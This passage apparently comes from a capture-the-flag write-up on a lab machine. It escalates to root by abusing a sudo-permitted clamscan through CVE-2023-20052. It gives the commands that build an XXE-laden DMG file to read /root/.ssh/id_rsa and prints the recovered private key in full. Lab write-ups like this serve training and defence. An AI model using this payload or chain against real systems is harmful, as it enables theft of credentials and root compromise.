Now, if I try to connect from my attacker machine to the <code>sbrown</code> user via SSH, it should not ask for a password since the <code>authorized_keys</code> file contains the SSH public key of my user.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="p">@</span><span class="n">kali$</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="n">sbrown</span><span class="mf">@10.10.11.212</span>
<span class="n">Welcome</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mf">22.04.2</span><span class="w"> </span><span class="n">LTS</span><span class="w"> </span><span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span><span class="w"> </span><span class="mf">5.15.0</span><span class="mi">-71</span><span class="o">-</span><span class="n">generic</span><span class="w"> </span><span class="n">x86_64</span><span class="p">)</span>

<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">Documentation</span><span class="o">:</span><span class="w">  </span><span class="n">https</span><span class="o">:</span><span class="c1">//help.ubuntu.com</span>
<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">Management</span><span class="o">:</span><span class="w">     </span><span class="n">https</span><span class="o">:</span><span class="c1">//landscape.canonical.com</span>
<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">Support</span><span class="o">:</span><span class="w">        </span><span class="n">https</span><span class="o">:</span><span class="c1">//ubuntu.com/advantage</span>

<span class="n">This</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="n">minimized</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">removing</span><span class="w"> </span><span class="n">packages</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">content</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">are</span>
<span class="n">not</span><span class="w"> </span><span class="n">required</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">log</span><span class="w"> </span><span class="n">into</span><span class="p">.</span>

<span class="n">To</span><span class="w"> </span><span class="n">restore</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">content</span><span class="p">,</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="err">'</span><span class="n">unminimize</span><span class="err">'</span><span class="w"> </span><span class="n">command</span><span class="p">.</span>
<span class="n">Failed</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">https</span><span class="o">:</span><span class="c1">//changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span>

<span class="n">sbrown</span><span class="p">@</span><span class="n">snoopy</span><span class="o">:~</span><span class="n">$</span><span class="w"> </span><span class="n">whoami</span><span class="w"> </span>
<span class="n">sbrown</span>
<span class="n">sbrown</span><span class="p">@</span><span class="n">snoopy</span><span class="o">:~</span><span class="n">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">user</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span>
<span class="mi">1</span><span class="n">b1358247bf3849430f5ab2e70893de3</span>
<span class="n">sbrown</span><span class="p">@</span><span class="n">snoopy</span><span class="o">:~</span><span class="n">$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>
<h3><br>Shell as root</br></h3><br>
Once we have accessed as <code>sbrown</code>, again listing their sudo privileges, we find the following:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">sbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span>
<span class="n">Matching</span><span class="w"> </span><span class="n">Defaults</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">sbrown</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="nl">snoopy</span><span class="p">:</span>
<span class="w">    </span><span class="n">env_keep</span><span class="o">+=</span><span class="ss">"LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET"</span><span class="p">,</span><span class="w"> </span><span class="n">env_keep</span><span class="o">+=</span><span class="ss">"XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH"</span><span class="p">,</span>
<span class="w">    </span><span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">sbin</span><span class="err">\:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">bin</span><span class="err">\:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="err">\:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="err">\:</span><span class="o">/</span><span class="n">sbin</span><span class="err">\:</span><span class="o">/</span><span class="n">bin</span><span class="p">,</span><span class="w"> </span><span class="n">mail_badpass</span>

<span class="k">User</span><span class="w"> </span><span class="n">sbrown</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">commands</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="nl">snoopy</span><span class="p">:</span>
<span class="w">    </span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="nl">NOPASSWD</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">clamscan</span><span class="w"> </span><span class="o">^--</span><span class="n">debug</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">sbrown</span><span class="o">/</span><span class="n">scanfiles</span><span class="o">/[</span><span class="n">a-zA-Z0-9.</span><span class="o">]+</span><span class="err">$</span>
<span class="n">sbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

It appears that we can execute the command as the root user without providing the password for the <code>sbrown</code> user: <code>/usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$</code><br/><br/>
ClamAV or clamscan is an antivirus primarily used on email servers and file servers to scan and protect against cyber threats such as viruses, trojans, and other types of malware. It can also be used on individual systems as an antivirus scanning tool.<br/><br/>
We can list the version to later search for vulnerabilities associated with it:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">sbrown</span><span class="nv">@snoopy</span><span class="err">:$</span><span class="w"> </span><span class="n">clamscan</span><span class="w"> </span><span class="o">--</span><span class="n">version</span>
<span class="n">ClamAV</span><span class="w"> </span><span class="mf">1.0.0</span><span class="o">/</span><span class="mi">26853</span><span class="o">/</span><span class="n">Fri</span><span class="w"> </span><span class="n">Mar</span><span class="w"> </span><span class="mi">24</span><span class="w"> </span><span class="mi">07</span><span class="err">:</span><span class="mi">24</span><span class="err">:</span><span class="mi">11</span><span class="w"> </span><span class="mi">2023</span>
</code></pre><br style="line-height: 0.5;"/></div>

After some searching on the internet, I found the following vulnerability: <a href="https://github.com/nokn0wthing/CVE-2023-20052">CVE-2023-20052</a>.<br/><br/>
<em>On Feb 15, 2023, the following vulnerability in the ClamAV scanning library was disclosed: A vulnerability in the DMG file parser of ClamAV versions 1.0.0 and earlier, 0.105.1 and earlier, and 0.103.7 and earlier could allow an unauthenticated, remote attacker to access sensitive information on an affected device. This vulnerability is due to enabling XML entity substitution that may result in XML external entity injection. An attacker could exploit this vulnerability by submitting a crafted DMG file to be scanned by ClamAV on an affected device. A successful exploit could allow the attacker to leak bytes from any file that may be read by the ClamAV scanning process.</em><br/><br/>
<em>From <a href="https://github.com/advisories/GHSA-pcr4-7r58-755h">GHSA-pcr4-7r58-755h</a></em><br/><br/>
The exploitation is quite straightforward, just follow the steps.<br/><br/>
First, we clone the repository on our attacker machine:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="n">clone</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">nokn0wthing</span><span class="o">/</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mf">20052.</span><span class="n">git</span>
<span class="n">Cloning</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="s1">'CVE-2023-20052'</span><span class="p">...</span>
<span class="nl">remote</span><span class="p">:</span><span class="w"> </span><span class="n">Enumerating</span><span class="w"> </span><span class="nl">objects</span><span class="p">:</span><span class="w"> </span><span class="mi">15</span><span class="p">,</span><span class="w"> </span><span class="n">done</span><span class="p">.</span>
<span class="nl">remote</span><span class="p">:</span><span class="w"> </span><span class="n">Counting</span><span class="w"> </span><span class="nl">objects</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="o">%</span><span class="w"> </span><span class="p">(</span><span class="mi">15</span><span class="o">/</span><span class="mi">15</span><span class="p">),</span><span class="w"> </span><span class="n">done</span><span class="p">.</span>
<span class="nl">remote</span><span class="p">:</span><span class="w"> </span><span class="n">Compressing</span><span class="w"> </span><span class="nl">objects</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="o">%</span><span class="w"> </span><span class="p">(</span><span class="mi">14</span><span class="o">/</span><span class="mi">14</span><span class="p">),</span><span class="w"> </span><span class="n">done</span><span class="p">.</span>
<span class="nl">remote</span><span class="p">:</span><span class="w"> </span><span class="n">Total</span><span class="w"> </span><span class="mi">15</span><span class="w"> </span><span class="p">(</span><span class="n">delta</span><span class="w"> </span><span class="mi">4</span><span class="p">),</span><span class="w"> </span><span class="n">reused</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="p">(</span><span class="n">delta</span><span class="w"> </span><span class="mi">0</span><span class="p">),</span><span class="w"> </span><span class="n">pack</span><span class="o">-</span><span class="n">reused</span><span class="w"> </span><span class="mi">0</span>
<span class="n">Receiving</span><span class="w"> </span><span class="nl">objects</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="o">%</span><span class="w"> </span><span class="p">(</span><span class="mi">15</span><span class="o">/</span><span class="mi">15</span><span class="p">),</span><span class="w"> </span><span class="mf">47.69</span><span class="w"> </span><span class="n">KiB</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mf">561.00</span><span class="w"> </span><span class="n">KiB</span><span class="o">/</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">done</span><span class="p">.</span>
<span class="n">Resolving</span><span class="w"> </span><span class="nl">deltas</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="o">%</span><span class="w"> </span><span class="p">(</span><span class="mi">4</span><span class="o">/</span><span class="mi">4</span><span class="p">),</span><span class="w"> </span><span class="n">done</span><span class="p">.</span>
</code></pre><br style="line-height: 0.5;"/></div>

We enter the directory and build the Docker image:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">20052</span>
<span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">docker</span><span class="w"> </span><span class="n">build</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="n">cve</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">20052</span><span class="w"> </span><span class="p">.</span>
</code></pre><br style="line-height: 0.5;"/></div>

Once it's finished, we access the container:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="p">@</span><span class="n">kali$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">docker</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="n">$</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span><span class="o">:/</span><span class="n">exploit</span><span class="w"> </span><span class="o">-</span><span class="n">it</span><span class="w"> </span><span class="n">cve</span><span class="mi">-2023-20052</span><span class="w"> </span><span class="n">bash</span>
<span class="n">root</span><span class="mi">@87</span><span class="n">a99884b443</span><span class="o">:/</span><span class="n">exploit</span><span class="err">#</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

Now, we need to create the malicious file that should be scanned by <code>clamscan</code>. The idea is to retrieve the <code>id_rsa</code> of the <code>root</code> user so we can connect through the SSH service using it as an authentication method.<br/><br/>
We generate the malicious file, replacing <code>/etc/passwd</code> with <code>/root/.ssh/id_rsa</code>:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">root</span><span class="mi">@87</span><span class="n">a99884b443</span><span class="o">:/</span><span class="n">exploit</span><span class="err">#</span><span class="w"> </span><span class="n">genisoimage</span><span class="w"> </span><span class="o">-</span><span class="n">D</span><span class="w"> </span><span class="o">-</span><span class="n">V</span><span class="w"> </span><span class="s">"exploit"</span><span class="w"> </span><span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">pad</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="o">-</span><span class="n">apple</span><span class="w"> </span><span class="o">-</span><span class="n">file</span><span class="o">-</span><span class="n">mode</span><span class="w"> </span><span class="mo">0777</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">test</span><span class="p">.</span><span class="n">img</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">dmg</span><span class="w"> </span><span class="n">dmg</span><span class="w"> </span><span class="n">test</span><span class="p">.</span><span class="n">img</span><span class="w"> </span><span class="n">test</span><span class="p">.</span><span class="n">dmg</span>
<span class="n">bbe</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="err">'</span><span class="n">s</span><span class="o">|&lt;!</span><span class="n">DOCTYPE</span><span class="w"> </span><span class="n">plist</span><span class="w"> </span><span class="n">PUBLIC</span><span class="w"> </span><span class="s">"-//Apple Computer//DTD PLIST 1.0//EN"</span><span class="w"> </span><span class="s">"http://www.apple.com/DTDs/PropertyList-1.0.dtd"</span><span class="o">&gt;|&lt;!</span><span class="n">DOCTYPE</span><span class="w"> </span><span class="n">plist</span><span class="w"> </span><span class="p">[</span><span class="o">&lt;!</span><span class="n">ENTITY</span><span class="w"> </span><span class="n">xxe</span><span class="w"> </span><span class="n">SYSTEM</span><span class="w"> </span><span class="s">"/root/.ssh/id_rsa"</span><span class="o">&gt;</span><span class="w"> </span><span class="p">]</span><span class="o">&gt;|</span><span class="err">'</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="err">'</span><span class="n">s</span><span class="o">/</span><span class="n">blkx</span><span class="o">/&amp;</span><span class="n">xxe</span><span class="err">\</span><span class="p">;</span><span class="o">/</span><span class="err">'</span><span class="w"> </span><span class="n">test</span><span class="p">.</span><span class="n">dmg</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">exploit</span><span class="p">.</span><span class="n">dmg</span>
</code></pre><br style="line-height: 0.5;"/></div>

Once it's done, we check to see if the malicious file has been created:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">root</span><span class="mi">@87</span><span class="n">a99884b443</span><span class="o">:/</span><span class="n">exploit</span><span class="err">#</span><span class="w"> </span><span class="n">ls</span>
<span class="mf">1.</span><span class="n">png</span><span class="w">  </span><span class="mf">2.</span><span class="n">png</span><span class="w">  </span><span class="n">Dockerfile</span><span class="w">  </span><span class="n">README</span><span class="p">.</span><span class="n">md</span><span class="w">  </span><span class="n">exploit</span><span class="p">.</span><span class="n">dmg</span><span class="w">  </span><span class="n">test</span><span class="p">.</span><span class="n">dmg</span><span class="w">  </span><span class="n">test</span><span class="p">.</span><span class="n">img</span>
<span class="n">root</span><span class="mi">@87</span><span class="n">a99884b443</span><span class="o">:/</span><span class="n">exploit</span><span class="err">#</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

The file in question is <code>exploit.dmg</code>, which needs to be analyzed by <code>clamscan</code>. To do this, I will upload the file to the victim machine.<br/><br/>
Once we have the file uploaded to the victim machine, we need to move it to the directory <code>/home/sbrown/scanfiles/</code>, as that is the path indicated when we run <code>sudo -l</code>.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">sbrown</span><span class="nv">@snoopy</span><span class="err">:</span><span class="o">~/</span><span class="n">scanfiles</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">clamscan</span><span class="w"> </span><span class="c1">--debug /home/sbrown/scanfiles/exploit.dmg</span>
</code></pre><br style="line-height: 0.5;"/></div>

Finally, we are shown the <code>id_rsa</code> belonging to the <code>root</code> user:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">LibClamAV</span> <span class="n">debug</span><span class="p">:</span> <span class="n">cli_magic_scan</span><span class="p">:</span> <span class="n">returning</span> <span class="mi">0</span>  <span class="n">at</span> <span class="n">line</span> <span class="mi">4997</span>
<span class="n">LibClamAV</span> <span class="n">debug</span><span class="p">:</span> <span class="n">clean_cache_add</span><span class="p">:</span> <span class="n">ca0f3dc75cf2cb616e0f5e5be1f43fc4</span> <span class="p">(</span><span class="n">level</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">LibClamAV</span> <span class="n">debug</span><span class="p">:</span> <span class="n">cli_scandmg</span><span class="p">:</span> <span class="n">wanted</span> <span class="n">blkx</span><span class="p">,</span> <span class="n">text</span> <span class="n">value</span> <span class="n">is</span> <span class="o">-----</span><span class="kr">BEGIN</span> <span class="n">OPENSSH</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
<span class="n">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
<span class="n">NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth</span><span class="o">/</span><span class="n">iMUF6W2ogsW0KPFN8MffExz2G9D</span><span class="o">/</span>
<span class="mi">4</span><span class="n">gpYjIcyauPHSrV4fjNGM46AizDTQIoK6MyN4K8PNzYMaVnB6IMG9AVthEu11nYzoqHmBf</span>
<span class="n">hy0cp4EaM3gITa10AMBAbnv2bQyWhVZaQlSQ5HDHt0Dw1mWBue5eaxeuqW3RYJGjKjuFSw</span>
<span class="n">kfWsSVrLTh5vf0gaV1ql59Wc8Gh7IKFrEEcLXLqqyDoprKq2ZG06S2foeUWkSY134Uz9oI</span>
<span class="n">Ctqf16lLFi4Lm7t5jkhW9YzDRha7Om5wpxucUjQCG5dU</span><span class="o">/</span><span class="n">Ij1BA5jE8G75PALrER</span><span class="o">/</span><span class="mi">4</span><span class="n">dIp2U</span>
<span class="n">zrXxs</span><span class="o">/</span><span class="mi">2</span><span class="n">Qqi</span><span class="o">/</span><span class="mi">4</span><span class="n">TPjFJZ5YyaforTB</span><span class="o">/</span><span class="n">nmO3DJawo6bclAA762n9bdkvlxWd14vig54yP7SSXU</span>
<span class="n">tPGvP4VpjyL7NcPeO7Jrf62UVjlmdro5xaHnbuKFevyPHXmSQUE4yU3SdQ9lrepY</span><span class="o">/</span><span class="n">eh4eN</span>
<span class="n">y0QJG7QUv8Z49qHnljwMTCcNeH6Dfc786jXguElzAAAFiAOsJ9IDrCfSAAAAB3NzaC1yc2</span>
<span class="n">EAAAGBANeetM1N4</span><span class="o">+</span><span class="mi">5</span><span class="n">hUFLOVwxiGq7Yf4jFBeltqILFtCjxTfDH3xMc9hvQ</span><span class="o">/+</span><span class="n">IKWIyHMmrj</span>
<span class="n">x0q1eH4zRjOOgIsw00CKCujMjeCvDzc2DGlZweiDBvQFbYRLtdZ2M6Kh5gX4ctHKeBGjN4</span>
<span class="n">CE2tdADAQG579m0MloVWWkJUkORwx7dA8NZlgbnuXmsXrqlt0WCRoyo7hUsJH1rElay04e</span>
<span class="n">b39IGldapefVnPBoeyChaxBHC1y6qsg6KayqtmRtOktn6HlFpEmNd</span><span class="o">+</span><span class="n">FM</span><span class="o">/</span><span class="n">aCAran9epSxYu</span>
<span class="n">C5u7eY5IVvWMw0YWuzpucKcbnFI0AhuXVPyI9QQOYxPBu</span><span class="o">+</span><span class="n">TwC6xEf</span><span class="o">+</span><span class="n">HSKdlM618bP9kKov</span>
<span class="o">+</span><span class="n">Ez4xSWeWMmn6K0wf55jtwyWsKOm3JQAO</span><span class="o">+</span><span class="n">tp</span><span class="o">/</span><span class="n">W3ZL5cVndeL4oOeMj</span><span class="o">+</span><span class="mi">0</span><span class="n">kl1LTxrz</span><span class="o">+</span><span class="n">FaY8i</span>
<span class="o">+</span><span class="n">zXD3juya3</span><span class="o">+</span><span class="n">tlFY5Zna6OcWh527ihXr8jx15kkFBOMlN0nUPZa3qWP3oeHjctECRu0FL</span><span class="o">/</span><span class="n">G</span>
<span class="n">ePah55Y8DEwnDXh</span><span class="o">+</span><span class="n">g33O</span><span class="o">/</span><span class="n">Oo14LhJcwAAAAMBAAEAAAGABnmNlFyya4Ygk1v</span><span class="o">+</span><span class="mi">4</span><span class="n">TBQ</span><span class="o">/</span><span class="n">M8jhU</span>
<span class="n">flVY0lckfdkR0t6f0Whcxo14z</span><span class="o">/</span><span class="n">IhqNbirhKLSOV3</span><span class="o">/</span><span class="mi">7</span><span class="n">jk6b3RB6a7ObpGSAz1zVJdob6tyE</span>
<span class="n">ouU</span><span class="o">/</span><span class="n">HWxR2SIQl9huLXJ</span><span class="o">/</span><span class="n">OnMCJUvApuwdjuoH0KQsrioOMlDCxMyhmGq5pcO4GumC2K0cXx</span>
<span class="n">dX621o6B51VeuVfC4dN9wtbmucocVu1wUS9dWUI45WvCjMspmHjPCWQfSW8nYvsSkp17ln</span>
<span class="n">Zvf5YiqlhX4pTPr6Y</span><span class="o">/</span><span class="n">sLgGF04M</span><span class="o">/</span><span class="n">mGpqskSdgpxypBhD7mFEkjH7zN</span><span class="o">/</span><span class="n">dDoRp9ca4ISeTVvY</span>
<span class="n">YnUIbDETWaL</span><span class="o">+</span><span class="n">Isrm2blOY160Z8CSAMWj4z5giV5nLtIvAFoDbaoHvUzrnir57wxmq19Grt</span>
<span class="mi">7</span><span class="n">ObZqpbBhX</span><span class="o">/</span><span class="n">GzitstO8EUefG8MlC</span><span class="o">+</span><span class="n">CM8jAtAicAtY7WTikLRXGvU93Q</span><span class="o">/</span><span class="n">cS0nRq0xFM1OEQ</span>
<span class="n">qb6AQCBNT53rBUZSS</span><span class="o">/</span><span class="n">cZwdpP2kuPPby0thpbncG13mMDNspG0ghNMKqJ</span><span class="o">+</span><span class="n">KnzTCxumBAAAA</span>
<span class="n">wEIF</span><span class="o">/</span><span class="n">p2yZfhqXBZAJ9aUK</span><span class="o">/</span><span class="n">TE7u9AmgUvvvrxNIvg57</span><span class="o">/</span><span class="n">xwt9yhoEsWcEfMQEWwru7y8oH2e</span>
<span class="n">IAFpy9gH0J2Ue1QzAiJhhbl1uixf</span><span class="o">+</span><span class="mi">2</span><span class="n">ogcs4</span><span class="o">/</span><span class="n">F6n8SCSIcyXub14YryvyGrNOJ55trBelVL</span>
<span class="n">BMlbbmyjgavc6d6fn2ka6ukFin</span><span class="o">+</span><span class="n">OyWTh</span><span class="o">/</span><span class="n">gyJ2LN5VJCsQ3M</span><span class="o">+</span><span class="n">qopfqDPE3pTr0MueaD4</span><span class="o">+</span><span class="n">ch</span>
<span class="n">k5qNOTkGsn60KRGY8kjKhTrN3O9WSVGMGF171J9xvX6m7iDQAAAMEA</span><span class="o">/</span><span class="n">c6AGETCQnB3AZpy</span>
<span class="mi">2</span><span class="n">cHu6aN0sn6Vl</span><span class="o">+</span><span class="n">tqoUBWhOlOAr7O9UrczR1nN4vo0TMW</span><span class="o">/</span><span class="n">VEmkhDgU56nHmzd0rKaugvTRl</span>
<span class="n">b9MNQg</span><span class="o">/</span><span class="n">YZmrZBnHmUBCvbCzq</span><span class="o">/</span><span class="mi">4</span><span class="n">tj45MuHq2bUMIaUKpkRGY1cv1BH</span><span class="o">+</span><span class="mi">06</span><span class="n">NV0irTSue</span><span class="o">/</span><span class="n">r64U</span>
<span class="o">+</span><span class="n">WJyKyl4k</span><span class="o">+</span><span class="n">oqCPCAgl4rRQiLftKebRAgY7</span><span class="o">+</span><span class="n">uMhFCo63W5NRApcdO</span><span class="o">+</span><span class="n">s0m7lArpj2rVB1oLv</span>
<span class="n">dydq</span><span class="o">+</span><span class="mi">68</span><span class="n">CXtKu5WrP0uB1oDp3BNCSh9AAAAwQDZe7mYQ1hY4WoZ3G0aDJhq1gBOKV2HFPf4</span>
<span class="mi">9</span><span class="n">O15RLXne6qtCNxZpDjt3u7646</span><span class="o">/</span><span class="n">aN32v7UVzGV7tw4k</span><span class="o">/</span><span class="n">H8PyU819R9GcCR4wydLcB4bY4b</span>
<span class="n">NQ</span><span class="o">/</span><span class="n">nYgjSvIiFRnP1AM7EiGbNhrchUelRq0RDugm4hwCy6fXt0rGy27bR</span><span class="o">+</span><span class="n">ucHi1W</span><span class="o">+</span><span class="n">njba6e</span>
<span class="n">SN</span><span class="o">/</span><span class="n">sjHa19HkZJeLcyGmU34</span><span class="o">/</span><span class="n">ESyN6HqFLOXfyGjqTldwVVutrE</span><span class="o">/</span><span class="n">Mvkm3ii</span><span class="o">/</span><span class="mi">0</span><span class="n">GqDkqW3PwgW</span>
<span class="n">atU0AwHtCazK8AAAAPcm9vdEBzbm9vcHkuaHRiAQIDBA</span><span class="o">==</span>
<span class="o">-----</span><span class="kr">END</span> <span class="n">OPENSSH</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>

<span class="n">LibClamAV</span> <span class="n">debug</span><span class="p">:</span> <span class="n">cli_scandmg</span><span class="p">:</span> <span class="n">wanted</span> <span class="n">blkx</span><span class="p">,</span> <span class="n">text</span> <span class="n">value</span> <span class="n">is</span> <span class="n">cSum</span>
<span class="n">LibClamAV</span> <span class="n">debug</span><span class="p">:</span> <span class="n">cli_scandmg</span><span class="p">:</span> <span class="n">wanted</span> <span class="n">blkx</span><span class="p">,</span> <span class="n">text</span> <span class="n">value</span> <span class="n">is</span> <span class="n">nsiz</span>
<span class="n">LibClamAV</span> <span class="n">debug</span><span class="p">:</span> <span class="n">cli_scandmg</span><span class="p">:</span> <span class="n">wanted</span> <span class="n">blkx</span><span class="p">,</span> <span class="n">text</span> <span class="n">value</span> <span class="n">is</span> <span class="n">plst</span>
</code></pre><br style="line-height: 0.5;"/></div>

To gain root access on the victim machine, we must copy the <code>id_rsa</code> to a file on our machine and assign it <code>600</code> privileges, i.e. only the owner can read it, otherwise it will not allow us to use it as an authentication method:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="p">@</span><span class="n">kali$</span><span class="w"> </span><span class="n">chmod</span><span class="w"> </span><span class="mi">600</span><span class="w"> </span><span class="n">root_id_rsa</span>
<span class="n">elswix</span><span class="p">@</span><span class="n">kali$</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">root_id_rsa</span><span class="w"> </span><span class="n">root</span><span class="mf">@10.10.11.212</span>
<span class="n">Welcome</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mf">22.04.2</span><span class="w"> </span><span class="n">LTS</span><span class="w"> </span><span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span><span class="w"> </span><span class="mf">5.15.0</span><span class="mi">-71</span><span class="o">-</span><span class="n">generic</span><span class="w"> </span><span class="n">x86_64</span><span class="p">)</span>

<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">Documentation</span><span class="o">:</span><span class="w">  </span><span class="n">https</span><span class="o">:</span><span class="c1">//help.ubuntu.com</span>
<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">Management</span><span class="o">:</span><span class="w">     </span><span class="n">https</span><span class="o">:</span><span class="c1">//landscape.canonical.com</span>
<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">Support</span><span class="o">:</span><span class="w">        </span><span class="n">https</span><span class="o">:</span><span class="c1">//ubuntu.com/advantage</span>

<span class="n">This</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="n">minimized</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">removing</span><span class="w"> </span><span class="n">packages</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">content</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">are</span>
<span class="n">not</span><span class="w"> </span><span class="n">required</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">log</span><span class="w"> </span><span class="n">into</span><span class="p">.</span>

